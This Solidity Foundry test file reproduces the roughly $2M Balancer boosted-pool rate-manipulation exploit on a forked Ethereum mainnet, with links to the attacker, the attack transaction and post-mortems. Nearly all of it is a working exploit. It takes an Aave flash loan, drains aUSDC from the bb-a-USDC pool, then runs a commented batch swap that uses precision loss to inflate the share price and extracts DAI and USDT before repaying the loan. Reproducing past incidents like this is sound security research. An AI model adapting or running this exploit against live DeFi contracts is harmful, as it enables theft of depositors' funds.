// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import "../test/../interface.sol";

// @KeyInfo - Total Lost : ~2M
// Attacker : https://etherscan.io/address/0xed187f37e5ad87d5b3b2624c01de56c5862b7a9b
// Attack Contract : https://etherscan.io/address/0x2100dcd8758ab8b89b9b545a43a1e47e8e2944f0
// Vulnerable Contract : https://etherscan.io/address/0x9210f1204b5a24742eba12f710636d76240df3d0
// Attack Tx : https://etherscan.io/tx/0x2a027c8b915c3737942f512fc5d26fd15752d0332353b3059de771a35a606c2d

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x9210f1204b5a24742eba12f710636d76240df3d0#code

// @Analysis
// Post-mortem : https://blocksecteam.medium.com/yet-another-risk-posed-by-precision-loss-an-in-depth-analysis-of-the-recent-balancer-incident-fad93a3c75d4
// Post-mortem : https://medium.com/balancer-protocol/rate-manipulation-in-balancer-boosted-pools-technical-postmortem-53db4b642492
// Twitter Guy : https://twitter.com/wavey0x/status/1702311454689357851

interface BBToken is IERC20 {
    function getVirtualSupply() external view returns (uint256);
}

contract ContractTest is Test {
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IAaveFlashloan aave = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IERC20 aUSDC = IERC20(0xd093fA4Fb80D09bB30817FDcd442d4d02eD3E5de);
    IERC20 aDAI = IERC20(0x02d60b84491589974263d922D9cC7a3152618Ef6);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    BBToken bbaUSDC = BBToken(0x9210F1204b5a24742Eba12f710636D76240dF3d0);
    BBToken bbaDAI = BBToken(0x804CdB9116a10bB78768D3252355a1b18067bF8f);
    BBToken bbaUSDT = BBToken(0x2BBf681cC4eb09218BEe85EA2a5d3D13Fa40fC0C);
    IERC20 bbaUSD = IERC20(0x7B50775383d3D6f0215A8F290f2C9e2eEBBEceb2);

    function setUp() public {
        vm.createSelectFork("mainnet", 18_004_651);
        vm.label(address(USDT), "USDT");
        vm.label(address(USDC), "USDC");
        vm.label(address(DAI), "DAI");
        vm.label(address(aave), "AAVE");
        vm.label(address(balancer), "Balancer");
        vm.label(address(bbaUSDC), "bb-a-USDC");
        vm.label(address(bbaDAI), "bb-a-DAI");
        vm.label(address(bbaUSD), "bb-a-USD");
        vm.label(address(bbaUSDT), "bb-a-USDT");
        vm.label(address(Router), "Router");
    }

    function testExploit() public {
        address[] memory assets = new address[](1);
        assets[0] = address(USDC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 300_000 * 1e6;
        uint256[] memory interestRateModes = new uint256[](2);
        interestRateModes[0] = 0;
        interestRateModes[1] = 0;
        aave.flashLoan(address(this), assets, amounts, interestRateModes, address(this), bytes(""), 0);

        emit log_named_decimal_uint(
            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
        );

        emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        bytes32 targetPool = 0x9210f1204b5a24742eba12f710636d76240df3d00000000000000000000000fc; // bb-a-USDC, USDC, aUSDC pool
        bytes32 bbaUSDPool = 0x7b50775383d3d6f0215a8f290f2c9e2eebbeceb20000000000000000000000fe; // bb-a-USDC, bb-a-DAI, bb-a-USDT pool

        // 1 drain all aUSDC from target pool
        {
            (, uint256[] memory poolBalance,) = balancer.getPoolTokens(targetPool);
            USDC.approve(address(balancer), type(uint256).max);
            balancer.swap(
                IBalancerVault.SingleSwap(
                    targetPool,
                    IBalancerVault.SwapKind.GIVEN_OUT,
                    address(USDC),
                    address(aUSDC),
                    poolBalance[2],
                    bytes("")
                ),
                IBalancerVault.FundManagement(address(this), false, payable(address(this)), false),
                amounts[0],
                block.timestamp
            );
        }

        uint256 virtualSupply = bbaUSDC.getVirtualSupply();

        // 2 batch swap
        bbaUSDC.approve(address(balancer), type(uint256).max);
        {
            address[] memory assets = new address[](8);
            assets[0] = address(USDC);
            assets[1] = address(aUSDC);
            assets[2] = address(bbaUSDC);
            assets[3] = address(bbaDAI);
            assets[4] = address(DAI);
            assets[5] = address(aDAI);
            assets[6] = address(bbaUSD);
            assets[7] = address(bbaUSDT);
            int256[] memory limits = new int256[](8);
            limits[0] = type(int256).max;
            limits[1] = type(int256).max;
            limits[2] = type(int256).max;
            limits[3] = type(int256).max;
            limits[4] = type(int256).max;
            limits[5] = type(int256).max;
            limits[6] = type(int256).max;
            limits[7] = type(int256).max;

            IBalancerVault.BatchSwapStep[] memory steps = new IBalancerVault.BatchSwapStep[](7);
            steps[0] = IBalancerVault.BatchSwapStep(
                targetPool, 2, 0, virtualSupply - 775_114_420_171 - 20_000_000_000, bytes("")
            ); // bb-a-USDC -> USDC  borrow bb-a-usdc by batchswap, burn almost all virtualSupply, make rate manipulation easier
            steps[1] = IBalancerVault.BatchSwapStep(targetPool, 2, 0, 775_114_420_171, bytes("")); // bb-a-USDC -> USDC  swap out zero USDC  due to precision loss, inflate share(bb-a-usdc) price
            steps[2] = IBalancerVault.BatchSwapStep(bbaUSDPool, 2, 3, 1e18, bytes("")); // bb-a-USDC -> bb-a-DAI  updating inflated prices to the cache
            steps[3] = IBalancerVault.BatchSwapStep(bbaUSDPool, 2, 3, 7300 * 1e18, bytes("")); // bb-a-USDC -> bb-a-DAI  profit by exchanging bb-a-usdc after manipulated price
            steps[4] = IBalancerVault.BatchSwapStep(bbaUSDPool, 2, 7, 14_000 * 1e18, bytes("")); // bb-a-USDC -> bb-a-USDT profit by exchanging bb-a-usdc after manipulated price
            steps[5] = IBalancerVault.BatchSwapStep(targetPool, 2, 0, 20_000_000_000, bytes("")); // bb-a-USDC -> USDC Bring virtualSupply to 0, reset bb-a-usdc price to 1
            steps[6] = IBalancerVault.BatchSwapStep(targetPool, 0, 2, 150_000 * 1e6, bytes("")); // USDC -> bb-a-USDC repay batch swap borrow
            balancer.batchSwap(
                IBalancerVault.SwapKind.GIVEN_IN,
                steps,
                assets,
                IBalancerVault.FundManagement(address(this), false, payable(address(this)), false),
                limits,
                2 ** 32
            );
        }

        // 3 swap bb-token to USDC/DAI/USDT

        uint256 repayAmount = amounts[0] + premiums[0];
        bbtokenTo_USDC_DAI_USDT(repayAmount);

        USDC.approve(address(aave), repayAmount);

        return true;
    }

    function bbtokenTo_USDC_DAI_USDT(uint256 repayAmount) internal {
        bytes32 targetPool = 0x9210f1204b5a24742eba12f710636d76240df3d00000000000000000000000fc;
        bytes32 bbaDAIPool = 0x804cdb9116a10bb78768d3252355a1b18067bf8f0000000000000000000000fb;
        bytes32 bbaUSDTPool = 0x2bbf681cc4eb09218bee85ea2a5d3d13fa40fc0c0000000000000000000000fd;

        // swap bb-a-dai to DAI
        bbaDAI.approve(address(balancer), type(uint256).max);
        balancer.swap(
            IBalancerVault.SingleSwap(
                bbaDAIPool,
                IBalancerVault.SwapKind.GIVEN_IN,
                address(bbaDAI),
                address(DAI),
                bbaDAI.balanceOf(address(this)),
                bytes("")
            ),
            IBalancerVault.FundManagement(address(this), false, payable(address(this)), false),
            0,
            block.timestamp
        );

        // swap bb-a-usdc to USDC
        bbaUSDC.approve(address(balancer), type(uint256).max);
        balancer.swap(
            IBalancerVault.SingleSwap(
                targetPool,
                IBalancerVault.SwapKind.GIVEN_IN,
                address(bbaUSDC),
                address(USDC),
                bbaUSDC.balanceOf(address(this)),
                bytes("")
            ),
            IBalancerVault.FundManagement(address(this), false, payable(address(this)), false),
            0,
            block.timestamp
        );

        // swap bb-a-usdt to USDT
        bbaUSDT.approve(address(balancer), type(uint256).max);
        balancer.swap(
            IBalancerVault.SingleSwap(
                bbaUSDTPool,
                IBalancerVault.SwapKind.GIVEN_IN,
                address(bbaUSDT),
                address(USDT),
                bbaUSDT.balanceOf(address(this)),
                bytes("")
            ),
            IBalancerVault.FundManagement(address(this), false, payable(address(this)), false),
            0,
            block.timestamp
        );

        // swap DAI to USDC, repay flashloan
        uint256 amount = repayAmount - USDC.balanceOf(address(this));
        DAI.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(DAI);
        path[1] = address(USDC);
        Router.swapTokensForExactTokens(amount, DAI.balanceOf(address(this)), path, address(this), block.timestamp);
    }

    receive() external payable {}
}
